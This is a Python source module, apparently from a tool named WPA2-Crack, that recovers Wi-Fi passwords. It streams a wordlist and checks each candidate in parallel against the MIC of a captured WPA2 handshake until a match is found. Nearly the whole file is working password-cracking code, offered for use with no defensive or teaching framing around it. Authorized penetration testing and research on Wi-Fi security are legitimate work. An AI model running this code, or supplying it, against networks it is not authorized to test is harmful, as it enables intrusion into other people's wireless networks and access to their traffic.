"""
Password cracking module for WPA2-Crack.
Provides streaming wordlist evaluation, multi-core worker processing with conservative defaults.
"""

import time
from concurrent.futures import ProcessPoolExecutor, as_completed
from typing import Generator, Iterator, Optional, Tuple, List
import os

from .crypto import verify_mic
from .pcap import HandshakeData
from .system import get_cpu_count

def _check_candidate(args: Tuple[str, str, bytes, bytes, bytes, bytes, bytes, bytes]) -> Tuple[str, bool]:
    """
    Worker function executed in parallel pool.
    Unpacks arguments and tests candidate password against MIC.
    """
    candidate, ssid, ap_mac, client_mac, anonce, snonce, eapol_zeroed, mic = args
    is_valid = verify_mic(
        passphrase=candidate,
        ssid=ssid,
        ap_mac=ap_mac,
        client_mac=client_mac,
        anonce=anonce,
        snonce=snonce,
        eapol_frame_zeroed=eapol_zeroed,
        expected_mic=mic
    )
    return candidate, is_valid


def stream_wordlist(wordlist_path: str, chunk_size: int = 1000) -> Generator[List[str], None, None]:
    """
    Stream wordlist line-by-line in chunks to maintain low memory usage on ARM64 Termux.
    """
    if not os.path.exists(wordlist_path):
        raise FileNotFoundError(f"Wordlist file not found: {wordlist_path}")

    chunk = []
    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            word = line.rstrip("\r\n")
            if word:
                chunk.append(word)
                if len(chunk) >= chunk_size:
                    yield chunk
                    chunk = []
        if chunk:
            yield chunk


def crack(handshake: HandshakeData, wordlist_path: str, workers: Optional[int] = None) -> Tuple[Optional[str], int, float]:
    """
    Main password cracking function.
    Streams wordlist and evaluates candidates across CPU worker processes.
    Returns (found_password, total_tried, elapsed_seconds).
    """
    total_cpus = get_cpu_count()
    if workers is None or workers <= 0:
        # Conservative default for mobile ARM64 CPU: half available cores, max 4
        workers = max(1, min(total_cpus // 2, 4)) if total_cpus > 1 else 1

    print(f"[+] Cracking SSID '{handshake.ssid}' (AP: {handshake.ap_mac_str()}, Client: {handshake.client_mac_str()})")
    print(f"[+] Using {workers} worker process(es)...")

    start_time = time.perf_counter()
    total_tried = 0
    found_password = None

    ssid = handshake.ssid
    ap_mac = handshake.ap_mac
    client_mac = handshake.client_mac
    anonce = handshake.anonce
    snonce = handshake.snonce
    eapol_zeroed = handshake.eapol_zeroed
    mic = handshake.mic

    chunk_size = 500

    with ProcessPoolExecutor(max_workers=workers) as executor:
        for chunk in stream_wordlist(wordlist_path, chunk_size=chunk_size):
            tasks = [
                executor.submit(
                    _check_candidate,
                    (word, ssid, ap_mac, client_mac, anonce, snonce, eapol_zeroed, mic)
                )
                for word in chunk
            ]

            for future in as_completed(tasks):
                total_tried += 1
                try:
                    candidate, matched = future.result()
                    if matched:
                        found_password = candidate
                        # Cancel remaining tasks if password found
                        for task in tasks:
                            task.cancel()
                        break
                except Exception as e:
                    pass

            if found_password:
                break

    elapsed = time.perf_counter() - start_time
    return found_password, total_tried, elapsed
